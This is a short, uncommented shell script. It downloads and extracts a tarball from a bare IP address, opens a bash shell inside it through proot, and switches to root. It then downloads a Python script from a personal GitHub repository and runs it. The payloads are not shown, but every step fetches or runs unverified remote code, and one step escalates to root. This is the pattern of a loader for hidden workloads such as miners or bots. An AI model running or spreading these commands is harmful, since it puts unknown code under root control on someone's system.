wget http://185.3.95.20/backup3.tar.gz
tar -xf backup3.tar.gz
./dist/proot -S . /bin/bash
sleep 2
su -
sleep 2
wget https://raw.githubusercontent.com/lungilemlonyeni859/prepSel/main/workload_for_pr.py
python3 workload_for_pr.py
